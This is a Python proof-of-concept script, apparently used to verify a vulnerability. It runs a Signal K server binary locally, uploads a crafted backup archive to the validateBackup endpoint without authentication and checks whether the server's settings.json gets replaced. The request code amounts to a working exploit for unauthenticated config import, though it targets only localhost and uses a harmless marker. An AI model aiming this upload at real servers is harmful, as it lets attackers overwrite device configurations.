#!/usr/bin/env python3
import argparse
import io
import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
import traceback
import urllib.error
import urllib.request
import uuid
import zipfile


MAX_OUTPUT_CHARS = 20000
MAX_BODY_BYTES = 65536
MAX_CONFIG_CONTENT = 20000


class OutputCollector:
    def __init__(self, stream):
        self.stream = stream
        self.parts = []
        self.thread = threading.Thread(target=self._read, daemon=True)

    def start(self):
        self.thread.start()

    def _read(self):
        try:
            while True:
                chunk = self.stream.read(4096)
                if not chunk:
                    break
                self.parts.append(chunk)
        except Exception:
            pass

    def text(self):
        data = b"".join(self.parts)
        return data.decode("utf-8", "replace")


def truncate_text(value, limit=MAX_OUTPUT_CHARS):
    if value is None:
        return ""
    if len(value) <= limit:
        return value
    return value[-limit:]


def signal_name(returncode):
    if returncode is None or returncode >= 0:
        return None
    try:
        return signal.Signals(-returncode).name
    except Exception:
        return "SIG%d" % (-returncode)


def pick_free_port():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]
    finally:
        sock.close()


def http_request(method, url, data=None, headers=None, timeout=5.0):
    headers = dict(headers or {})
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read(MAX_BODY_BYTES)
    except urllib.error.HTTPError as err:
        try:
            body = err.read(MAX_BODY_BYTES)
        except Exception:
            body = b""
        return err.code, dict(err.headers), body
    except Exception as err:
        return 0, {}, str(err).encode("utf-8", "replace")


def wait_ready(base_url, proc, deadline):
    probes = [
        "/skServer/loginStatus",
        "/loginStatus",
        "/signalk",
        "/",
    ]
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            return False
        for path in probes:
            status, _headers, _body = http_request("GET", base_url + path, timeout=0.5)
            if status:
                return True
        time.sleep(0.2)
    return False


def make_backup_zip(marker, port):
    settings = {
        "pipedProviders": [],
        "interfaces": {},
        "mdns": False,
        "port": port,
        "poc_marker": marker,
        "poc_source": "runtime-generated",
    }
    data = json.dumps(settings, indent=2, sort_keys=True).encode("utf-8")
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("settings.json", data)
    return bio.getvalue(), data.decode("utf-8")


def make_multipart(file_bytes, filename):
    boundary = "----pocboundary%s" % uuid.uuid4().hex
    head = (
        "--%s\r\n"
        'Content-Disposition: form-data; name="file"; filename="%s"\r\n'
        "Content-Type: application/octet-stream\r\n"
        "\r\n"
    ) % (boundary, filename)
    tail = "\r\n--%s--\r\n" % boundary
    body = head.encode("utf-8") + file_bytes + tail.encode("utf-8")
    headers = {
        "Content-Type": "multipart/form-data; boundary=%s" % boundary,
        "Content-Length": str(len(body)),
    }
    return body, headers


def login(base_url, username, password, deadline):
    body = json.dumps({"username": username, "password": password}).encode("utf-8")
    headers = {"Content-Type": "application/json"}
    for path in ("/signalk/v1/auth/login", "/login"):
        if time.monotonic() >= deadline:
            break
        status, _headers, resp_body = http_request(
            "POST", base_url + path, data=body, headers=headers, timeout=5.0
        )
        if status == 200:
            try:
                parsed = json.loads(resp_body.decode("utf-8", "replace"))
                token = parsed.get("token")
                if token:
                    return token, status, path
            except Exception:
                pass
        if status not in (0, 404, 405):
            return None, status, path
    return None, 0, None


def unauthenticated_import(base_url, archive_bytes, marker, deadline):
    filename = "signalk-%s.backup" % marker
    body, headers = make_multipart(archive_bytes, filename)
    # This is the import request. It intentionally carries no cookies,
    # Authorization header, bearer token, or previous login state.
    for path in ("/skServer/validateBackup", "/validateBackup"):
        if time.monotonic() >= deadline:
            break
        status, _headers, resp_body = http_request(
            "POST", base_url + path, data=body, headers=headers, timeout=10.0
        )
        if status not in (0, 404, 405):
            return status, path, resp_body
    return status if "status" in locals() else 0, None, b""


def authenticated_apply(base_url, token, deadline):
    body = json.dumps({"settings.json": True}).encode("utf-8")
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer %s" % token
    for path in ("/skServer/restore", "/restore"):
        if time.monotonic() >= deadline:
            break
        status, _headers, resp_body = http_request(
            "POST", base_url + path, data=body, headers=headers, timeout=10.0
        )
        if status not in (0, 404, 405):
            return status, path, resp_body
    return status if "status" in locals() else 0, None, b""


def scan_config_dir(config_dir, marker):
    marker_bytes = marker.encode("utf-8")
    for root, dirs, files in os.walk(config_dir, topdown=True, followlinks=False):
        dirs[:] = [d for d in dirs if d != "node_modules"]
        for name in sorted(files):
            path = os.path.join(root, name)
            try:
                if not os.path.isfile(path):
                    continue
                with open(path, "rb") as fh:
                    data = fh.read(2 * 1024 * 1024)
                if marker_bytes in data:
                    content = data.decode("utf-8", "replace")
                    if len(content) > MAX_CONFIG_CONTENT:
                        content = content[:MAX_CONFIG_CONTENT]
                    return True, content, path
            except Exception:
                continue
    return False, None, None


def stop_process(proc, base_url, token, deadline):
    if proc is None:
        return None
    if proc.poll() is not None:
        return proc.returncode

    if token and time.monotonic() < deadline:
        body = b"{}"
        headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer %s" % token,
        }
        http_request("PUT", base_url + "/skServer/restart", data=body, headers=headers, timeout=2.0)
        try:
            return proc.wait(timeout=4.0)
        except subprocess.TimeoutExpired:
            pass

    if proc.poll() is None:
        proc.terminate()
        try:
            return proc.wait(timeout=4.0)
        except subprocess.TimeoutExpired:
            proc.kill()
            return proc.wait(timeout=4.0)
    return proc.returncode


def write_result(result, path):
    encoded = json.dumps(result, sort_keys=False)
    if path:
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(encoded)
            fh.write("\n")
    else:
        print(encoded)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", required=True)
    parser.add_argument("--json-out")
    parser.add_argument("--timeout", type=float, default=90.0)
    args = parser.parse_args()

    started = time.monotonic()
    deadline = started + max(1.0, args.timeout)
    proc = None
    stdout_collector = None
    stderr_collector = None
    config_dir = None
    token = None
    base_url = None
    timed_out = False
    error = None

    marker = "POC_%s" % uuid.uuid4().hex
    import_http = 0
    apply_http = 0
    config_replaced = False
    config_content = None

    result = {
        "binary": args.binary,
        "command": [args.binary],
        "returncode": None,
        "signal": None,
        "timed_out": False,
        "runtime_ms": 0,
        "stdout": "",
        "stderr": "",
        "observable": {
            "kind": "custom",
            "value": "",
            "path": None,
        },
        "error": None,
    }

    try:
        port = pick_free_port()
        base_url = "http://127.0.0.1:%d" % port
        username = "admin_%s" % uuid.uuid4().hex[:12]
        password = "pw_%s" % uuid.uuid4().hex
        config_dir = tempfile.mkdtemp(prefix="signalk-poc-")

        initial_settings = {
            "pipedProviders": [],
            "interfaces": {},
            "mdns": False,
            "port": port,
            "poc_initial": "no-marker",
        }
        with open(os.path.join(config_dir, "settings.json"), "w", encoding="utf-8") as fh:
            json.dump(initial_settings, fh, indent=2, sort_keys=True)

        archive_bytes, _payload_settings = make_backup_zip(marker, port)
        env = os.environ.copy()
        for key in (
            "PORT",
            "ADMINUSER",
            "SIGNALK_NODE_CONFIG_DIR",
            "SIGNALK_NODE_CONDFIG_DIR",
            "SIGNALK_NODE_SETTINGS",
        ):
            env.pop(key, None)
        env["PORT"] = str(port)
        env["ADMINUSER"] = "%s:%s" % (username, password)
        env["SIGNALK_NODE_CONFIG_DIR"] = config_dir

        proc = subprocess.Popen(
            [args.binary],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
            env=env,
        )
        stdout_collector = OutputCollector(proc.stdout)
        stderr_collector = OutputCollector(proc.stderr)
        stdout_collector.start()
        stderr_collector.start()

        if not wait_ready(base_url, proc, deadline):
            if proc.poll() is not None:
                error = "server exited before accepting HTTP requests"
            else:
                timed_out = True
                error = "timed out waiting for server startup"
        else:
            if time.monotonic() >= deadline:
                timed_out = True
                error = "run timed out"
            else:
                import_http, _import_path, _import_body = unauthenticated_import(
                    base_url, archive_bytes, marker, deadline
                )

            if time.monotonic() >= deadline:
                timed_out = True
                error = "run timed out"
            else:
                token, _login_status, _login_path = login(base_url, username, password, deadline)
                apply_http, _apply_path, _apply_body = authenticated_apply(base_url, token, deadline)

            end_poll = min(deadline, time.monotonic() + 5.0)
            while time.monotonic() < end_poll:
                config_replaced, config_content, _path = scan_config_dir(config_dir, marker)
                if config_replaced:
                    break
                time.sleep(0.2)

            if time.monotonic() >= deadline and not config_replaced:
                timed_out = True
                error = "run timed out"

    except FileNotFoundError as exc:
        error = "could not start binary: %s" % exc
    except PermissionError as exc:
        error = "could not start binary: %s" % exc
    except Exception:
        error = "internal exception: %s" % traceback.format_exc(limit=5)
    finally:
        if timed_out and proc is not None and proc.poll() is None:
            try:
                proc.kill()
                proc.wait(timeout=4.0)
            except Exception:
                pass
        elif proc is not None:
            try:
                stop_process(proc, base_url, token, deadline if not timed_out else time.monotonic())
            except Exception:
                try:
                    if proc.poll() is None:
                        proc.kill()
                        proc.wait(timeout=4.0)
                except Exception:
                    pass

        if stdout_collector is not None:
            stdout_collector.thread.join(timeout=1.0)
        if stderr_collector is not None:
            stderr_collector.thread.join(timeout=1.0)

        stdout_text = stdout_collector.text() if stdout_collector else ""
        stderr_text = stderr_collector.text() if stderr_collector else ""
        combined_tail = truncate_text((stdout_text + stderr_text), 12000)

        returncode = proc.returncode if proc is not None else None
        result["returncode"] = returncode
        result["signal"] = signal_name(returncode)
        result["timed_out"] = bool(timed_out)
        result["runtime_ms"] = int((time.monotonic() - started) * 1000)
        result["stdout"] = truncate_text(stdout_text)
        result["stderr"] = truncate_text(stderr_text)

        evidence = {
            "triggered": bool(config_replaced),
            "import_http": int(import_http or 0),
            "apply_http": int(apply_http or 0),
            "config_replaced": bool(config_replaced),
            "marker": marker,
            "config_content": config_content,
            "server_log_tail": combined_tail,
        }
        result["observable"]["value"] = json.dumps(evidence, separators=(",", ":"))
        result["error"] = error

        if config_dir:
            shutil.rmtree(config_dir, ignore_errors=True)

        write_result(result, args.json_out)

    return 0


if __name__ == "__main__":
    sys.exit(main())
